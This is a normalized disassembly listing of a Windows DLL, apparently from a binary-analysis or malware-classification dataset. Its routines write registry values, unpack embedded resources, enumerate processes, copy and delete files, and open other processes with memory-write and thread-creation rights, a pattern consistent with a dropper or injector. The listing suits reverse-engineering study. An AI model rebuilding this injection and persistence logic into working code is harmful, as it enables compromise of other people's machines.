mov [ ebp - 0x4 ] bl
mov ecx [ ebp - 0x18 ]
cmp ecx ebx
je r-xdata
push r--data
lea ecx [ ebp - 0x40 ]
call sub_10001c7f
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x4
push eax
mov ebx edi
jmp r-xdata
lea edx [ ebp - 0x14 ]
push edx
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push ebx
push ecx
push [ eax + 0x4 ]
call edi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ ebp + 0xc ]
call sub_100282db
retn 0xc
call sub_10003d5c
lea esi [ ebp - 0x6c ]
call sub_10017079
push r--data
mov eax esi
push eax
call sub_10027dd1
sub_10015320
push 0x0
mov eax sub_1004cc46
call sub_10028203
mov edi ecx
mov esi [ ebp + 0x8 ]
mov eax [ edi ]
mov [ esi ] eax
mov eax [ edi + 0x4 ]
mov [ esi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
lea ecx [ esi + 0x8 ]
call sub_10003d36
and [ ebp - 0x4 ] 0x0
add edi 0xc
push edi
lea ecx [ esi + 0xc ]
call sub_1000136c
mov eax esi
call sub_100282db
retn 0x4
sub_10015361
push 0x4c
mov eax sub_1004db5f
call sub_10028203
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x10 ]
cmp [ eax + 0x1c ] 0x10
mov edx [ eax + 0x18 ]
jb r-xdata
add eax 0x8
mov eax [ eax + 0x8 ]
jmp r-xdata
add ecx 0x4
mov ecx [ ecx + 0x4 ]
jmp r-xdata
cmp [ ecx + 0x18 ] 0x8
jb r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp + 0x14 ]
test ecx ecx
je r-xdata
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001c7f
lea eax [ ebp - 0x28 ]
push eax
lea esi [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x1
call sub_10017079
push r--data
mov eax esi
push eax
call sub_10027dd1
push edx
push eax
push [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push 0x0
push ecx
push [ eax + 0x4 ]
call [ RegSetValueExW@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
call sub_100282db
retn 0x10
call sub_10003d5c
sub_100153ef
push 0x20
mov eax sub_1004e145
call sub_10028203
mov edi ecx
push ecx
push ecx
mov esi esp
mov eax edi
mov [ ebp - 0x10 ] esp
call sub_1001552d
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x2c ]
push eax
mov eax edi
call sub_10015541
mov [ ebp - 0x4 ] 0x1
mov edi [ edi ]
push edi
push [ ebp + 0x8 ]
mov ecx eax
mov [ ebp - 0x4 ] 0x2
call sub_10015361
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10001500
call sub_100282db
retn 0x4
sub_10015443
push 0x4c
mov eax sub_1004db34
call sub_10028203
mov eax [ ebp + 0xc ]
xor esi esi
cmp [ eax + 0x18 ] 0x8
mov [ ebp + 0xc ] esi
mov [ ebp - 0x10 ] esi
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
cmp ebx esi
je r-xdata
xor al al
jmp r-xdata
lea ecx [ ebp + 0xc ]
push ecx
push esi
lea ecx [ ebp - 0x10 ]
push ecx
push esi
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0x4 ]
call [ RegQueryValueExW@IAT ]
mov ebx eax
cmp ebx 0x2
jne r-xdata
mov al 0x1
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10001c7f
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x4 ] esi
push eax
lea esi [ ebp - 0x58 ]
call sub_10017079
push r--data
mov eax esi
push eax
call sub_10027dd1
call sub_100282db
retn 0x8
sub_100154c1
push 0x0
mov eax sub_1004cc20
call sub_10028203
mov esi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
mov [ esi ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0x4 ] eax
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ esi + 0x8 ]
call sub_10003d36
push [ ebp + 0x18 ]
lea ecx [ esi + 0xc ]
mov [ ebp - 0x4 ] 0x1
call sub_1000136c
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp + 0x14 ]
test ecx ecx
je r-xdata
mov eax esi
call sub_100282db
retn 0x14
call sub_10003d5c
sub_1001555c
push 0x14
mov eax sub_1004cefd
call sub_10028203
mov eax [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
lea esi [ ebp - 0x20 ]
call sub_1001552d
mov edi eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
inc ebx
lea esi [ ebp - 0x18 ]
mov [ ebp - 0x4 ] ebx
call sub_1001552d
mov [ ebp - 0x4 ] 0x2
mov eax [ eax ]
cmp [ eax + 0x1c ] 0x10
mov ecx [ edi ]
mov ecx [ ecx + 0x18 ]
jb r-xdata
add eax 0x8
mov eax [ eax + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x1c ]
test ecx ecx
je r-xdata
call sub_10003d5c
dec ecx
shr ecx 0x1
push ecx
mov ecx [ ebp + 0xc ]
push eax
call sub_100026f9
mov [ ebp - 0x4 ] bl
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x10 ] ebx
test ecx ecx
je r-xdata
mov eax [ ebp + 0xc ]
call sub_100282db
retn 0x8
call sub_10003d5c
sub_100155dd
push 0x3c
mov eax sub_1004d336
call sub_10028203
and [ ebp - 0x14 ] 0x0
push 0x20
call sub_10024389
mov esi eax
pop ecx
mov [ ebp - 0x18 ] esi
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
test esi esi
je r-xdata
xor esi esi
cmp [ edi + 0x18 ] 0x8
mov ecx [ edi + 0x14 ]
jb r-xdata
lea ecx [ eax + 0x8 ]
mov ecx [ eax + 0x8 ]
jmp r-xdata
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
call sub_100282db
retn
call sub_10003d5c
push [ ebp + 0xc ]
mov eax [ edi + 0x14 ]
push ecx
push ecx
xor edx edx
mov [ ecx + eax * 2 ] dx
mov ecx [ ebp - 0x20 ]
mov eax esp
mov [ eax ] ecx
lea ecx [ ebp - 0x1c ]
mov [ ebp + 0xc ] esp
push ecx
lea ecx [ eax + 0x4 ]
call sub_10003d36
push ebx
lea eax [ ebp - 0x48 ]
push eax
call sub_100154c1
mov [ ebp - 0x4 ] 0x3
push [ ebp + 0x8 ]
mov ecx eax
call sub_10015320
lea esi [ ebp - 0x48 ]
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] 0x2
call sub_10015514
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x1c ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0x0
push esi
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x20 ] esi
call sub_100032f5
push esi
lea eax [ ebp - 0x20 ]
push esi
push eax
call sub_10001a27
add esp 0xc
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp - 0x20 ]
cmp [ eax + 0x1c ] 0x10
jb r-xdata
lea ecx [ ecx + ecx + 0x2 ]
push ecx
push eax
call sub_10015017
mov esi eax
jmp r-xdata
sub_100156dd
push 0x1c
mov eax sub_1004e11a
call sub_10028203
push r--data
lea ecx [ ebp - 0x28 ]
mov [ esi ] r--data
call sub_1000134a
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
call sub_10015727
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
mov [ esi + 0x4 ] eax
call sub_10001500
mov eax esi
call sub_100282db
retn
sub_10015727
push 0x20
mov eax sub_1004e168
call sub_10028203
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push eax
call [ GetModuleHandleW@IAT ]
push r--data
lea ecx [ ebp - 0x28 ]
mov esi eax
call sub_10001c7f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
test esi esi
sete al
movzx eax al
push eax
call sub_10014ddd
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_10002020
mov eax esi
call sub_100282db
retn 0x4
sub_10015788
push 0x40
mov eax sub_1004e0f7
call sub_10028203
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
xor ebx ebx
push 0x6
mov [ ebp - 0x10 ] ebx
call [ GetModuleHandleExW@IAT ]
mov esi r--data
push esi
lea ecx [ ebp - 0x2c ]
mov [ ebp + 0x8 ] eax
call sub_10001c7f
xor edi edi
lea eax [ ebp - 0x2c ]
inc edi
cmp [ ebp + 0x8 ] edi
push eax
setne al
movzx eax al
push eax
mov [ ebp - 0x4 ] ebx
call sub_10014ddd
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push ebx
push edi
lea ecx [ ebp - 0x2c ]
call sub_10002020
push esi
lea ecx [ ebp - 0x48 ]
call sub_10001c7f
mov [ ebp - 0x4 ] edi
cmp [ ebp - 0x10 ] ebx
lea eax [ ebp - 0x48 ]
push eax
sete al
movzx eax al
push eax
call sub_10014ddd
pop ecx
pop ecx
push ebx
push edi
lea ecx [ ebp - 0x48 ]
call sub_10002020
mov eax [ ebp - 0x10 ]
call sub_100282db
retn 0x4
sub_10015818
push 0x1c
mov eax sub_1004dff5
call sub_10028203
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x10
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov eax esi
call sub_100282db
retn 0x8
call [ GetLastError@IAT ]
cmp eax 0x2
je r-xdata
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0x4 ]
call [ GetProcAddress@IAT ]
mov esi eax
test esi esi
jne r-xdata
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001c7f
and [ ebp - 0x4 ] esi
lea eax [ ebp - 0x28 ]
push eax
push 0x1
call sub_10014ddd
pop ecx
pop ecx
push esi
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_10002020
sub_10015885
push 0x1c
mov eax sub_1004dff5
call sub_10028203
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x10
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0x4 ]
call [ GetProcAddress@IAT ]
push r--data
lea ecx [ ebp - 0x28 ]
mov esi eax
call sub_10001c7f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
test esi esi
sete al
movzx eax al
push eax
call sub_10014ddd
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_10002020
mov eax esi
call sub_100282db
retn 0x8
sub_100158ec
push 0x230
mov eax sub_1004e0bf
call sub_1002826c
mov eax [ ebp + 0x8 ]
and [ ebp - 0x220 ] 0x0
mov esi 0x208
push esi
mov [ ebp - 0x21c ] eax
lea eax [ ebp - 0x218 ]
push 0x0
push eax
call sub_10024b80
add esp 0xc
push esi
lea eax [ ebp - 0x218 ]
push eax
push [ ebp - 0x21c ]
call [ GetModuleFileNameW@IAT ]
push r--data
lea ecx [ ebp - 0x23c ]
mov esi eax
call sub_10001c7f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x23c ]
push eax
test esi esi
sete al
movzx eax al
push eax
call sub_10014ddd
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x23c ]
call sub_10002020
push esi
lea eax [ ebp - 0x218 ]
push eax
mov ecx ebx
call sub_100026f9
mov eax ebx
call sub_100282ef
retn
sub_1001598d
push ecx
push ecx
and [ esp + 0x4 ] 0x0
push ebx
push [ eax + 0x4 ]
mov ebx ecx
call sub_100158ec
pop ecx
mov eax ebx
pop ebx
pop ecx
pop ecx
retn
sub_100159a6
push 0x20
mov eax sub_1004e168
call sub_10028203
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] ecx
cmp [ eax + 0x18 ] 0x8
movzx edx dx
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push eax
push edx
push ecx
call [ FindResourceW@IAT ]
push r--data
lea ecx [ ebp - 0x28 ]
mov [ esi ] eax
call sub_10001c7f
and [ ebp - 0x4 ] 0x0
cmp [ esi ] 0x0
lea eax [ ebp - 0x28 ]
push eax
sete al
movzx eax al
push eax
call sub_10014ddd
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_10002020
mov eax esi
call sub_100282db
retn 0x4
sub_10015a10
push 0x38
mov eax sub_1004e099
call sub_10028203
mov eax [ ebp + 0x8 ]
push [ eax ]
push [ eax + 0x4 ]
call [ LoadResource@IAT ]
mov esi r--data
push esi
lea ecx [ ebp - 0x28 ]
mov ebx eax
call sub_10001c7f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
test ebx ebx
sete al
movzx eax al
push eax
call sub_10014ddd
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_10002020
push ebx
call [ LockResource@IAT ]
push esi
lea ecx [ ebp - 0x44 ]
mov ebx eax
call sub_10001c7f
lea eax [ ebp - 0x44 ]
push eax
test ebx ebx
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10014ddd
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x44 ]
call sub_10002020
mov eax ebx
call sub_100282db
retn 0x4
sub_10015aa5
push 0x28
mov eax sub_1004e746
call sub_10028203
mov esi ecx
xor edi edi
push esi
mov [ ebp - 0x10 ] edi
call sub_10015a10
push [ esi ]
mov [ ebp - 0x10 ] eax
push [ esi + 0x4 ]
call [ SizeofResource@IAT ]
push r--data
lea ecx [ ebp - 0x30 ]
mov ebx eax
call sub_10001c7f
lea eax [ ebp - 0x30 ]
push eax
cmp ebx edi
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] edi
call sub_10014ddd
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
xor esi esi
push edi
inc esi
push esi
lea ecx [ ebp - 0x30 ]
call sub_10002020
push 0x20
call sub_10024389
pop ecx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] esi
cmp eax edi
je r-xdata
mov esi [ ebp + 0x8 ]
or [ ebp - 0x4 ] 0xffffffff
call sub_10003257
mov eax esi
call sub_100282db
retn 0x4
push ebx
push [ ebp - 0x10 ]
mov esi eax
call sub_10015017
mov edi eax
sub_10015b38
push 0x30
mov eax sub_1004e06e
call sub_10028203
lea eax [ ebp - 0x14 ]
push eax
push 0x4
push esi
push sub_10015c20
push [ ebp + 0x8 ]
xor ebx ebx
push ebx
call [ CreateThread@IAT ]
push r--data
lea ecx [ ebp - 0x3c ]
mov [ ebp - 0x18 ] eax
call sub_10001c7f
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x18 ] ebx
lea eax [ ebp - 0x3c ]
push eax
sete al
movzx eax al
push eax
call sub_10014ddd
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push ebx
push 0x1
lea ecx [ ebp - 0x3c ]
call sub_10002020
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
push esi
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
call sub_10014e13
mov [ esi ] r--data
mov [ esi + 0xc ] bl
mov [ esi + 0xd ] bl
mov [ esi + 0x10 ] ebx
mov eax esi
call sub_100282db
retn 0x4
sub_10015bdd
push 0xc
mov eax sub_1004e719
call sub_10028236
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
push esi
mov [ ebp - 0x4 ] 0x1
call sub_10014f38
jmp r-xdata
mov ecx esi
mov [ esi ] r--data
call sub_1001675f
call sub_100282db
retn
sub_10015c20
push 0x8
push r--data
call sub_1002ca38
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0x8 ]
test ecx ecx
jne r-xdata
mov eax [ ecx ]
call [ eax + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
jmp sub_10015c62
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
inc eax
jmp sub_10015c62
sub_10015c82
push 0x3c
mov eax sub_1004e04b
call sub_10028203
xor edi edi
push edi
push 0x2
call CreateToolhelp32Snapshot
mov esi r--data
push esi
lea ecx [ ebp - 0x28 ]
mov ebx eax
call sub_10001c7f
lea eax [ ebp - 0x28 ]
push eax
cmp ebx edi
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] edi
call sub_10014ddd
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push edi
inc edi
push edi
lea ecx [ ebp - 0x28 ]
call sub_10002020
push esi
lea ecx [ ebp - 0x44 ]
call sub_10001c7f
lea eax [ ebp - 0x44 ]
push eax
cmp ebx 0xffffffff
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] edi
call sub_10014ddd
pop ecx
pop ecx
push 0x0
push edi
lea ecx [ ebp - 0x44 ]
call sub_10002020
mov eax ebx
call sub_100282db
retn
sub_10015d02
push 0x60
mov eax sub_1004e020
call sub_10028203
test edi edi
jne r-xdata
mov esi 0x22c
push esi
push 0x0
push edi
call sub_10024b80
mov eax [ ebp + 0x8 ]
add esp 0xc
mov [ edi ] esi
mov eax [ eax + 0x4 ]
push edi
push eax
call Process32FirstW
xor ebx ebx
mov esi eax
inc ebx
cmp esi ebx
je r-xdata
push r--data
lea ecx [ ebp - 0x44 ]
call sub_10001c7f
and [ ebp - 0x4 ] edi
lea eax [ ebp - 0x44 ]
push eax
lea ecx [ ebp - 0x6c ]
call sub_10002075
push r--data
lea eax [ ebp - 0x6c ]
push eax
call sub_10027dd1
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001c7f
lea eax [ ebp - 0x28 ]
push eax
cmp esi ebx
setne al
movzx eax al
push eax
mov [ ebp - 0x4 ] ebx
call sub_10014ddd
pop ecx
pop ecx
push 0x0
push ebx
lea ecx [ ebp - 0x28 ]
call sub_10002020
mov al bl
call [ GetLastError@IAT ]
cmp eax 0x12
jne r-xdata
xor al al
jmp r-xdata
call sub_100282db
retn 0x4
sub_10015dad
push 0x60
mov eax sub_1004e020
call sub_10028203
test edi edi
jne r-xdata
mov esi 0x22c
push esi
push 0x0
push edi
call sub_10024b80
mov eax [ ebp + 0x8 ]
add esp 0xc
mov [ edi ] esi
mov eax [ eax + 0x4 ]
push edi
push eax
call Process32NextW
xor ebx ebx
mov esi eax
inc ebx
cmp esi ebx
je r-xdata
push r--data
lea ecx [ ebp - 0x44 ]
call sub_10001c7f
and [ ebp - 0x4 ] edi
lea eax [ ebp - 0x44 ]
push eax
lea ecx [ ebp - 0x6c ]
call sub_10002075
push r--data
lea eax [ ebp - 0x6c ]
push eax
call sub_10027dd1
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001c7f
lea eax [ ebp - 0x28 ]
push eax
cmp esi ebx
setne al
movzx eax al
push eax
mov [ ebp - 0x4 ] ebx
call sub_10014ddd
pop ecx
pop ecx
push 0x0
push ebx
lea ecx [ ebp - 0x28 ]
call sub_10002020
mov al bl
call [ GetLastError@IAT ]
cmp eax 0x12
jne r-xdata
xor al al
jmp r-xdata
call sub_100282db
retn 0x4
sub_10015e58
push 0x1c
mov eax sub_1004dff5
call sub_10028203
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
add ecx 0x4
mov ecx [ ecx + 0x4 ]
jmp r-xdata
cmp [ ecx + 0x18 ] 0x8
jb r-xdata
push 0x0
push eax
push ecx
call [ CopyFileW@IAT ]
push r--data
lea ecx [ ebp - 0x28 ]
mov edi eax
call sub_10001c7f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
cmp edi 0x1
setne al
movzx eax al
push eax
call sub_10014ddd
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_10002020
call sub_100282db
retn
sub_10015ec7
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004dfbf
mov eax [ fs : 0x0 ]
push eax
sub esp 0x94
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8c ] eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xa0 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ esp + 0x18 ] eax
xor ecx ecx
cmp [ ebx + 0x18 ] 0x8
lea eax [ ebx + 0x4 ]
mov [ esp + 0x10 ] ecx
mov [ esp + 0x14 ] eax
jb r-xdata
mov esi [ GetEnvironmentVariableW@IAT ]
push ecx
push ecx
push eax
call esi
mov edi r--data
push edi
lea ecx [ esp + 0x20 ]
mov [ esp + 0x14 ] eax
call sub_10001c7f
and [ esp + 0xa8 ] 0x0
cmp [ esp + 0x10 ] 0x0
lea eax [ esp + 0x1c ]
push eax
sete al
movzx eax al
push eax
call sub_10014ddd
or [ esp + 0xb0 ] 0xffffffff
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ esp + 0x24 ]
call sub_10002020
push 0x0
push [ esp + 0x14 ]
lea ecx [ esp + 0x84 ]
call sub_1000691b
mov [ esp + 0xa8 ] 0x1
cmp [ esp + 0x94 ] 0x8
mov ecx [ esp + 0x80 ]
jae r-xdata
mov eax [ eax ]
cmp [ ebx + 0x18 ] 0x8
mov eax [ esp + 0x14 ]
jb r-xdata
lea ecx [ esp + 0x80 ]
push [ esp + 0x90 ]
push ecx
push eax
call esi
push edi
lea ecx [ esp + 0x20 ]
mov esi eax
call sub_10001c7f
lea eax [ esp + 0x1c ]
push eax
test esi esi
sete al
movzx eax al
push eax
mov [ esp + 0xb0 ] 0x2
call sub_10014ddd
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ esp + 0x24 ]
mov [ esp + 0xb0 ] 0x1
call sub_10002020
inc esi
cmp [ esp + 0x10 ] esi
je r-xdata
mov eax [ eax ]
cmp [ esp + 0x94 ] 0x8
mov eax [ esp + 0x80 ]
jae r-xdata
push r--data
lea ecx [ esp + 0x3c ]
call sub_10001c7f
lea eax [ esp + 0x38 ]
push eax
lea ecx [ esp + 0x58 ]
mov [ esp + 0xac ] 0x3
call sub_10002075
push r--data
lea eax [ esp + 0x58 ]
push eax
call sub_10027dd1
mov ecx [ esp + 0x18 ]
push eax
call sub_1000134a
push 0x0
push 0x1
lea ecx [ esp + 0x84 ]
call sub_10001500
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0xa0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ esp + 0x8c ]
xor ecx esp
call sub_100242d7
mov esp ebp
pop ebp
retn
lea eax [ esp + 0x80 ]
sub_10016092
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004df6b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x284
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x27c ] eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x290 ]
mov [ fs : 0x0 ] eax
xor edi edi
push 0x20a
lea eax [ esp + 0x78 ]
push edi
push eax
mov esi ecx
mov [ esp + 0x1c ] edi
call sub_10024b80
add esp 0xc
cmp [ esi + 0x18 ] 0x8
jb r-xdata
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
lea eax [ esp + 0x74 ]
push eax
mov ecx ebx
call sub_1000134a
mov eax ebx
mov ecx [ esp + 0x290 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ esp + 0x27c ]
xor ecx esp
call sub_100242d7
mov esp ebp
pop ebp
retn
push r--data
lea ecx [ esp + 0x34 ]
call sub_10001c7f
lea eax [ esp + 0x30 ]
push eax
lea ecx [ esp + 0x50 ]
mov [ esp + 0x29c ] edi
call sub_10002075
push r--data
lea eax [ esp + 0x50 ]
push eax
call sub_10027dd1
lea eax [ esp + 0x74 ]
push eax
push edi
push edi
push esi
call [ GetTempFileNameW@IAT ]
push r--data
lea ecx [ esp + 0x18 ]
mov esi eax
call sub_10001c7f
lea eax [ esp + 0x14 ]
push eax
cmp esi edi
sete al
movzx eax al
push eax
mov [ esp + 0x2a0 ] edi
call sub_10014ddd
or [ esp + 0x2a0 ] 0xffffffff
pop ecx
pop ecx
push edi
xor edi edi
inc edi
push edi
lea ecx [ esp + 0x1c ]
call sub_10002020
cmp esi 0x6f
jne r-xdata
sub_100161b2
push 0x20
mov eax sub_1004e168
call sub_10028203
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
call sub_100282db
retn
call [ GetLastError@IAT ]
mov esi eax
cmp esi 0x2
je r-xdata
push eax
call [ DeleteFileW@IAT ]
cmp eax 0x1
je r-xdata
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001c7f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
mov eax esi
call sub_10015045
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_10002020
sub_10016217
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004df27
mov eax [ fs : 0x0 ]
push eax
sub esp 0x90
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x88 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xa0 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi [ GetSystemDirectoryW@IAT ]
xor ebx ebx
push ebx
push ebx
mov [ esp + 0x20 ] eax
mov [ esp + 0x1c ] ebx
call esi
mov edi r--data
push edi
lea ecx [ esp + 0x20 ]
mov [ esp + 0x18 ] eax
call sub_10001c7f
cmp [ esp + 0x14 ] ebx
lea eax [ esp + 0x1c ]
push eax
sete al
movzx eax al
push eax
mov [ esp + 0xb0 ] ebx
call sub_10014ddd
or [ esp + 0xb0 ] 0xffffffff
pop ecx
pop ecx
push ebx
push 0x1
lea ecx [ esp + 0x24 ]
call sub_10002020
push ebx
push [ esp + 0x18 ]
lea ecx [ esp + 0x84 ]
call sub_1000691b
mov [ esp + 0xa8 ] 0x1
cmp [ esp + 0x94 ] 0x8
mov eax [ esp + 0x80 ]
jae r-xdata
push [ esp + 0x14 ]
push eax
call esi
push edi
lea ecx [ esp + 0x20 ]
mov esi eax
call sub_10001c7f
lea eax [ esp + 0x1c ]
push eax
cmp esi ebx
sete al
movzx eax al
push eax
mov [ esp + 0xb0 ] 0x2
call sub_10014ddd
pop ecx
pop ecx
push ebx
push 0x1
lea ecx [ esp + 0x24 ]
mov [ esp + 0xb0 ] 0x1
call sub_10002020
inc esi
cmp [ esp + 0x14 ] esi
je r-xdata
lea eax [ esp + 0x80 ]
cmp [ esp + 0x94 ] 0x8
mov eax [ esp + 0x80 ]
jae r-xdata
push r--data
lea ecx [ esp + 0x3c ]
call sub_10001c7f
lea eax [ esp + 0x38 ]
push eax
lea ecx [ esp + 0x58 ]
mov [ esp + 0xac ] 0x3
call sub_10002075
push r--data
lea eax [ esp + 0x58 ]
push eax
call sub_10027dd1
mov ecx [ esp + 0x18 ]
push eax
call sub_1000134a
push ebx
push 0x1
lea ecx [ esp + 0x84 ]
call sub_10001500
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0xa0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x88 ]
xor ecx esp
call sub_100242d7
mov esp ebp
pop ebp
retn
lea eax [ esp + 0x80 ]
sub_100163be
push 0x48
mov eax sub_1004d2e8
call sub_10028203
mov eax [ ebp + 0x8 ]
mov [ eax ] r--data
mov ecx r--data
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edx
and [ ebp - 0x4 ] 0x0
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x1
test edx edx
jne r-xdata
call sub_100282db
retn 0x4
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10001c7f
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x2
call sub_10002075
push r--data
lea eax [ ebp - 0x54 ]
push eax
call sub_10027dd1
sub_10016443
push esi
mov esi ecx
push edi
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
mov edi r--data
mov [ ecx ] edi
call sub_1001675f
lea ecx [ esi + 0x4 ]
mov [ ecx ] edi
pop edi
pop esi
jmp sub_1001675f
sub_10016468
push 0x28
mov eax sub_1004e746
call sub_10028203
push [ ebp + 0x8 ]
xor edi edi
push edi
push 0x3a
mov [ ebp - 0x10 ] edi
call [ OpenProcess@IAT ]
push r--data
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x10 ] eax
call sub_10001c7f
cmp [ ebp - 0x10 ] edi
lea eax [ ebp - 0x30 ]
push eax
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] edi
call sub_10014ddd
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push edi
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_10002020
push 0x14
call sub_10024389
pop ecx
mov [ ebp - 0x14 ] eax
